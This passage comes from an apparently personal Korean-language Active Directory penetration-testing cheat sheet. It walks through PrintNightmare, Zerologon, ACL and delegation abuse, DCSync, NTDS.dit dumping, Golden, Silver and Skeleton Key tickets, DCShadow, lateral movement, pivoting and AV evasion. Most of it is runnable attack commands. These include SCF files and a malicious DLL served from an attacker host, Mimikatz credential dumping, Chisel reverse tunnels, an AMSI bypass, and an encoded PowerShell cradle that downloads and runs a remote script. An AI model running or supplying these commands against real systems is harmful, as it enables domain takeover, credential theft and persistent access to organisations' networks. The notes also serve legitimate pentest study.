cat > @exploit.scf << EOF
[Shell]
Command=2
IconFile=\\[ATTACKER-IP]\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF

# .url 파일
cat > @exploit.url << EOF
[InternetShortcut]
URL=file://[ATTACKER-IP]/share
EOF

----------------------------------------------------------------------------

(쉐어에 배치)

# CrackMapExec으로 쓰기 가능한 쉐어 탐색
crackmapexec smb [TARGET] -u [user] -p [pass] --shares

# NetExec slinky로 자동화 (생성+배치 한번에)
netexec smb [TARGET-IPs] -u [user] -p [pass] -M slinky -o SERVER=[ATTACKER-IP] NAME=@exploit

---------------------------------------------------------------------------------

(Responder 대기)

sudo responder -I eth0 -v
```

### [3-9 : PrintNightmare (CVE-2021-34527) ]

Windows Print Spooler 서비스의 취약점으로 원격에서 악성 DLL을 로드해 SYSTEM 권한 획득이 가능한 공격이다

**사용조건:**

```bash
1.도메인 유저 크리덴셜 보유
2.대상 머신이 패치되지 않은 상태 (2021년 7월 이전)
3.Print Spooler 서비스가 실행 중
```

**공격 흐름 + 툴 & 명령어:**

```bash
1.취약한 머신 탐색 (Print Spooler 실행 여부 확인)
2.악성 DLL 파일 준비 (리버스 쉘 or 로컬 어드민 계정 추가)
3.Kali에 SMB 쉐어 열어서 DLL 제공
4.exploit 실행 → 타겟이 공격자 SMB에서 DLL 로드
5.SYSTEM 권한으로 DLL 실행
6.리버스 쉘 or 새 어드민 계정 생성 완료

------------------------------------------------------------------

# 취약성 확인
crackmapexec smb [IP] -u [user] -p [pass] -M printnightmare

# cube0x0 exploit 사용
# https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py domain.local/[user]:[pass]@[IP] '\\[ATTACKER-IP]\share\evil.dll'

# Impacket 기반
python3 printnightmare.py domain.local/[user]:[pass]@[IP] '\\[ATTACKER-IP]\share\evil.dll'
```

### [3-10 : Zerologon (CVE-2020-1472)]

Netlogon 프로토콜의 암호화 취약점으로 인증 없이 DC의 머신 계정 패스워드를 공백으로 초기화 가능한 공격이다

(즉시 도메인 장악 가능)

**작동원리:**

```bash
1. 공격자가 Netlogon 패킷의 IV를 0으로 채워서 DC에 전송
2. AES-CFB8 특성상 IV가 0이면 256번 중 1번꼴로 암호화 결과도 0
3. 이걸 평균 256번 반복
4. 암호화 결과가 0이 나오면 DC가 복호화했을 때 패스워드도 0(공백)
5. DC가 패스워드 공백으로 인증 통과
6. DC 머신 계정 패스워드를 공백으로 초기화
7. 공격자가 빈 패스워드로 DC 로그인 → 도메인 장악
```

**사용조건:**

```bash
1.DC에 네트워크 접근 가능
#ping [DC-IP] 가 됨
#445 포트가 열려있음
2.패치되지 않은 DC (2020년 8월 이전)
3.주의: 실제 환경에서는 DC를 망가뜨릴 수 있으므로 신중히 사용
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.DC IP 확인
2.Zerologon 취약성 테스트 (zerologon_tester.py)
3.취약 확인 시 → DC 머신 계정 패스워드를 공백으로 초기화
4.빈 패스워드로 DC 머신 계정 인증
5.secretsdump.py로 모든 해시 덤프
6.DA 해시로 도메인 장악
7.DC 원래 패스워드 복구 필수 (안 하면 DC 망가짐)

-----------------------------------------------------------------------

(공격 실행)

# 취약성 확인
python3 zerologon_tester.py [DC-NETBIOS-NAME] [DC-IP]

# 익스플로잇 (DC 패스워드를 공백으로 초기화)
python3 cve-2020-1472-exploit.py [DC-NETBIOS-NAME] [DC-IP]

# 이후 secretsdump.py로 해시 덤프
secretsdump.py -no-pass -just-dc [domain]/[DC-NETBIOS-NAME]\$@[DC-IP]

# 복구 (원래 패스워드 복원 필수!)
python3 restorepassword.py [domain]/[DC-NETBIOS-NAME]@[DC-IP] -target-ip [DC-IP] -hexpass [원래 hex 패스워드]
```

### [3-11 : ACL / ACE 남용]

AD의 객체(유저, 그룹, 컴퓨터)에는 접근 제어 목록(ACL)이 있는데 GenericWrite, WriteDACL, WriteOwner 등 잘못 설정된 권한을 통해 다른 계정을 탈취하거나 권한 상승 가능해진다

**주요 위험 권한:**

```bash
1.GenericAll - 대상 계정 패스워드 변경, SPN 설정
2.GenericWrite - SPN 설정 (Kerberoasting), 로그인 스크립트 수정
3.WriteDACL - 자신에게 DCSync 권한 부여
4.WriteOwner - 소유자 변경 후 권한 획득
5.ForceChangePassword - 패스워드 강제 변경
```

**사용 조건:**

```bash
1.도메인 유저 크리덴셜 보유
2.BloodHound 또는 PowerView로 잘못된 ACL 탐색 가능한 상태
3.내 계정이 타겟 객체에 위험 권한을 가지고 있어야 함
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.BloodHound로 잘못된 ACL 탐색
2.내 계정이 타겟에 GenericAll/GenericWrite 등 보유 확인
3.권한에 따라 공격 방식 선택:
4.GenericWrite → SPN 설정 → Kerberoasting
5.WriteDACL → 내 계정에 DCSync 권한 부여 → DCSync
6.ForceChangePassword → 타겟 패스워드 강제 변경
7.WriteOwner → 소유자 변경 → GenericAll 획득
8.상승된 권한으로 추가 공격

-------------------------------------------------------------------

(탐색 및 공격)

# BloodHound에서 시각적으로 확인

# PowerView로 특정 계정의 ACL 확인
Get-ObjectAcl -Identity [user] -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL"}

# GenericWrite로 SPN 설정 → Kerberoasting
Set-DomainObject -Identity [target-user] -Set @{serviceprincipalname='fake/spn'}
# 이후 Kerberoasting 실행

# ForceChangePassword 악용 (PowerView)
$SecPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity [target-user] -AccountPassword $SecPassword -Verbose
```

### [3-12 : Kerberos Delegation 남용]

Delegation은 서비스가 유저를 대신해 다른 서비스에 접근할 수 있도록 하는 기능이다

즉 잘못 설정된 Delegation을 이용해 권한 상승에 악용이 가능해진다

**사용조건:**

```bash
1.도메인 유저 크리덴셜 보유
2.Unconstrained: Delegation 설정된 머신에 로컬 어드민 접근 가능해야 함
3.RBCD: 타겟 컴퓨터 객체에 GenericWrite 이상의 권한 보유해야 함
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름 1 - Unconstrained)

1.Unconstrained Delegation 머신 탐색 (BloodHound or PowerView)
2.해당 머신에 로컬 어드민 접근 확보
3.Rubeus monitor로 TGT 캡처 대기
4.PrinterBug/SpoolSample로 DC가 해당 머신에 접속하도록 유도
5.DC의 TGT가 메모리에 캐시됨
6.TGT 추출 → DCSync 또는 골든 티켓으로 연결

(공격 1 - Unconstrained Delegation)

# 대상 탐색 (모든 서비스에 위임 가능 = 가장 위험)
Get-DomainComputer -Unconstrained

# DC가 접속하도록 유도 (PrinterBug/SpoolSample)
# → DC의 TGT 메모리에 캐시됨 → 탈취
.\Rubeus.exe monitor /interval:5 /nowrap
SpoolSample.exe [DC-IP] [ATTACKER-IP]

--------------------------------------------------------------------------

(공격 흐름 2 - RBCD)

1.내 계정이 타겟 컴퓨터에 GenericWrite 권한 확인
2.새 머신 계정 생성 or 기존 머신 계정 해시 획득
3.타겟 컴퓨터의 msDS-AllowedToActOnBehalfOf 속성 수정
4.Rubeus s4u로 Administrator 티켓 요청
5.타겟 컴퓨터에 어드민 접근

(공격 2 - Resource-Based Constrained Delegation (RBCD))

# msDS-AllowedToActOnBehalfOfOtherIdentity 속성 수정
# PowerView + Impacket
Set-DomainObject -Identity [target-computer] -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
.\Rubeus.exe s4u /user:[our-machine$] /rc4:[machine-hash] /impersonateuser:administrator /msdsspn:cifs/[target] /ptt
```

### [4단계 : Domain Compromise (도메인 장악)]

4단계에선 도메인 어드민 또는 동등한 권한을 획득 후 DC를 완전히 장악하는 것이 목표이다

### [4-1 : DCSync Attack]

DCSync Attack은 공격자가 가짜 DC처럼 행동하여 실제 DC에 데이터 복제를 요청하는 공격 기법이다

이를 이용해 도메인의 모든 계정 해시(NTLM, Kerberos 키 포함)를 물리적으로 DC에 접근하지 않고 추출 가능하다

**사용조건:**

```bash
1.DS-Replication-Get-Changes + DS-Replication-Get-Changes-All 권한이 있는 계정 보유
2.보통 Domain Admin, Enterprise Admin, Domain Controllers 그룹이 이 권한을 가짐
3.BloodHound로 "Find Principals with DCSync Rights" 쿼리로 비표준 계정 탐색 가능
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.DA 권한 or DCSync 권한 있는 계정 확보
2.가짜 DC인 척 실제 DC에 복제 요청 (DRSUAPI GetNCChanges)
3.DC가 정상 복제 요청으로 판단하고 해시 반환
4.모든 계정의 NTLM 해시 + Kerberos 키 획득
5.krbtgt 해시 → Golden Ticket 생성
6.Administrator 해시 → Pass-the-Hash

--------------------------------------------------------------------

(공격 실행)

# Mimikatz (Windows, DA 권한)
1.mimikatz.exe 실행
2.privilege::debug(권한 상승)

3-1.lsadump::dcsync /user:Administrator
→ Administrator 계정 해시만 뽑기

3-2.lsadump::dcsync /domain:domain.local /all /csv
→ 도메인 전체 계정 해시 뽑기 + CSV 형식으로 출력

# secretsdump.py (Kali, 크리덴셜 있을 때)
secretsdump.py domain.local/[DA-user]:[pass]@[DC-IP] -just-dc-ntlm

# secretsdump.py (해시로)
secretsdump.py -hashes :[NTLM-hash] domain.local/[user]@[DC-IP] -just-dc-ntlm
```

### [4-2 : NTDS.dit 덤프]

DC의 Active Directory 데이터베이스 파일(NTDS.dit)을 직접 추출해 전체 해시 획득하는 공격이다

※SYSTEM 레지스트리 하이브(복호화 키 존재)도 필요함

**사용조건:**

```bash
1.DC에 직접 접근 가능 (로컬 또는 원격)
2.DA 권한 또는 Backup Operators 권한
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

DC에 DA 권한으로 접근 (Evil-WinRM, psexec 등)
  → Volume Shadow Copy 생성 (실행 중인 파일 복사 위해)
  → Shadow Copy에서 NTDS.dit + SYSTEM 하이브 복사
  → Kali로 파일 전송
  → secretsdump.py로 오프라인 해시 추출
  → 전체 도메인 계정 해시 확보

-----------------------------------------------------------------

(공격 실행)

# Volume Shadow Copy 활용 (Windows)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
reg save HKLM\SYSTEM C:\SYSTEM

# Kali에서 추출
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# impacket ntdsutil
ntdsutil.py [user]@[DC-IP] -hashes :[hash]
```

### [4-3 : Golden Ticket Attack]

krbtgt 계정의 NTLM 해시로 TGT(Ticket Granting Ticket)를 위조하는 공격이다

위조된 TGT는 도메인 내 어디든 접근 가능하며 유효기간을 10년으로 설정 가능하고 패스워드 변경 후에도 유지가능 하다 (krbtgt 패스워드를 2번 초기화해야 무효화 가능)

**사용조건:**

```bash
1.krbtgt 계정의 NTLM 해시 보유 (DCSync 또는 NTDS.dit로 획득)
2.도메인 SID 필요
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.DCSync or NTDS.dit로 krbtgt 해시 획득
2.도메인 SID 확인 (whoami /user or Get-DomainSID)
3.Mimikatz / Rubeus로 TGT 위조
4.(어떤 유저명이든 가능, 존재하지 않아도 됨)
5.위조 티켓을 메모리에 주입 (/ptt)
6.도메인 내 모든 서비스 접근 가능
7.패스워드 변경해도 krbtgt 2번 초기화 전까지 유효

--------------------------------------------------------------------------------

(필요 정보 수집)

# 도메인 SID 확인
whoami /user  # S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-[RID]
# 또는
Get-DomainSID  # PowerView

# krbtgt 해시 (DCSync)
secretsdump.py domain.local/[DA-user]:[pass]@[DC-IP] -just-dc-user krbtgt

------------------------------------------------------------------------------------

(Golden Ticket 생성 및 사용)

# Mimikatz
1.mimikatz.exe 실행
2.kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXX /krbtgt:[krbtgt-hash] /ptt
※실제 /user:Administrator 아니어도 됨 /user:FakeAdmin → 존재하지 않는 계정도 가능
※서명만 맞으면 통과하기 때문

# Rubeus
.\Rubeus.exe golden /rc4:[krbtgt-hash] /domain:domain.local /sid:S-1-5-21-XXXXXXX /user:FakeAdmin /ptt

# 주입 후 접근 확인
dir \\DC\C$
psexec.exe \\DC cmd.exe
```

### [4-4 : Silver Ticket Attack]

서비스 계정의 해시로 TGS(Ticket Granting Service) 티켓을 위조하는 공격이다

Golden Ticket과 달리 DC와 통신하지 않아 탐지가 더 어렵지만 특정 서비스에만 접근 가능하다

**사용조건:**

```bash
1.서비스 계정 NTLM 해시 보유
2.타겟 서비스의 SPN 정보 필요
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.서비스 계정 해시 획득 (Kerberoasting 크랙 or Mimikatz)
2.타겟 서비스의 SPN 확인 (예: cifs/fileserver.domain.local)
3.Mimikatz로 TGS 위조 (DC와 통신 없이 로컬에서 생성)
4.위조 티켓 주입 (/ptt)
5.해당 서비스만 접근 가능 (Golden보다 범위 좁지만 탐지 어려움)

---------------------------------------------------------------------------

(공격 실행)

# Mimikatz
1.mimikatz.exe 실행
2.kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXX /target:[service-host] /service:cifs /rc4:[service-account-hash] /ptt

# 접근 확인
dir \\[target]\C$
```

### [4-5 : Skeleton Key Attack]

DC의 LSASS 프로세스에 마스터 패스워드(모든 계정에 로그인 가능한 패스워드)를 인젝션 해 모든 계정에 "Mimikatz"라는 패스워드로 인증 가능하도록 만드는 공격이다 (기존 패스워드도 유지됨)

※재부팅 시 사라짐.

**사용조건:**

```bash
1.DC에 DA 권한으로 접근 가능
2.AV/EDR 우회 가능해야 함
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.DC에 DA 권한으로 접근
2.Mimikatz를 DC에 업로드
3.privilege::debug → misc::skeleton 실행
4.LSASS에 마스터 패스워드 ("Mimikatz") 인젝션
5.이후 도메인의 모든 계정에 "Mimikatz" 패스워드로 인증 가능
6.기존 패스워드도 여전히 유효 (병행 존재)
7.재부팅 시 사라짐 (영구 아님)

------------------------------------------------------------------

(공격 실행)

# Mimikatz (DC에서 실행)
1.mimikatz.exe 실행
2.privilege::debug(권한 상승)
3.misc::skeleton(Skeleton Key 인젝션)

# 이후 어떤 계정이든 패스워드 "Mimikatz"로 인증 가능
net use \\DC\C$ /user:Administrator Mimikatz
```

### [4-6 : DCShadow]

가짜 DC를 AD에 등록하고 악성 변경사항(새 계정, 권한 변경 등)을 실제 AD에 강제로 밀어넣는 고급 공격이다

※기존 감사 로그를 우회 가능

**사용조건:**

```bash
1.DA 권한 보유
2.두 개의 Mimikatz 인스턴스 필요
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.DA 권한으로 머신 접근
2.Mimikatz 인스턴스 1: 가짜 DC 등록 (lsadump::dcshadow)
3.Mimikatz 인스턴스 2: 밀어넣을 변경사항 준비 (예: 특정 유저에 DA 권한 부여, 백도어 계정 생성 등)
4./push로 변경사항을 실제 AD에 강제 복제
5.기존 감사 로그에는 정상 DC 복제로 보임
6.탐지 극히 어려움

--------------------------------------------------------------------------

(공격 실행)

터미널 1 - (가짜 DC 시작)
1. mimikatz.exe 실행
2. !+
3. !processtoken
4. lsadump::dcshadow
→ 가짜 DC 등록 후 대기

터미널 2 - (변경사항 푸시)
1. mimikatz.exe 실행
2. lsadump::dcshadow /object:targetuser /attribute:description /value:"hacked"
→ 변경사항 준비
3. lsadump::dcshadow /push
→ AD에 강제 복제

-------------------------------------------------------------------------------

(확인 방법)

# PowerShell로 확인
Get-ADUser targetuser -Properties description
→ description이 "hacked"로 바뀌었는지 확인

# DA 그룹 멤버 확인
Get-ADGroupMember "Domain Admins"
→ targetuser가 추가됐는지 확인
```

### [5단계 : Post-Exploitation & Persistence (지속 접근)]

마지막 5단계에선 DC를 장악 후 접근을 유지하며 필요한 시스템으로 이동 하는 것이 목표이다

### [5-1 : Lateral Movement (횡적 이동)]

```bash
# psexec.py - SMB로 원격 명령
psexec.py domain.local/Administrator:[pass]@[IP]
psexec.py -hashes :[hash] domain.local/Administrator@[IP]

# wmiexec.py - WMI로 원격 명령 (더 조용함)
wmiexec.py domain.local/Administrator:[pass]@[IP]

# smbexec.py - SMB로 실행
smbexec.py domain.local/Administrator:[pass]@[IP]

# Evil-WinRM - PowerShell 원격 (WinRM, 포트 5985)
evil-winrm -i [IP] -u Administrator -p [pass]
evil-winrm -i [IP] -u Administrator -H [hash]

# RDP
xfreerdp /v:[IP] /u:Administrator /p:[pass] +clipboard /dynamic-resolution
```

### [5-2 : Credential Dumping]

```bash
# Mimikatz - LSASS 메모리 덤프
1. mimikatz.exe 실행
2. privilege::debug
3-1. sekurlsa::logonpasswords → 평문 패스워드 + 해시
3-2. lsadump::sam → SAM 데이터베이스 로컬 계정 해시
3-3. lsadump::lsa /patch → LSA Secrets 캐시된 크리덴셜

# CrackMapExec
crackmapexec smb [IP] -u [user] -p [pass] --lsa   → LSA Secrets 덤프
crackmapexec smb [IP] -u [user] -p [pass] --ntds  → DC NTDS.dit 덤프

# secretsdump.py
secretsdump.py domain.local/[user]:[pass]@[IP] → SAM + LSA + NTDS 전부 덤프
```

### [5-3 : Network Pivoting (피버팅)]

```bash
# proxychains 설정
# /etc/proxychains.conf에 추가:
# socks5 127.0.0.1 1080

# SSH 터널 (SOCKS5 프록시)
ssh -D 1080 -f -N user@[jump-host]

# Chisel 터널
# 서버 (공격자)
chisel server --port 8080 --reverse

# 클라이언트 (피해자)
chisel client [ATTACKER-IP]:8080 R:socks

# 이후 proxychains으로 내부 네트워크 접근
proxychains nmap -sT -Pn 10.10.10.0/24
```

### [5-4 : AV / EDR 우회 기본]

```bash
# AMSI Bypass (PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execution Policy 우회
powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1

# Base64 인코딩
$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString('http://[IP]/script.ps1')"))
powershell -enc $enc
```
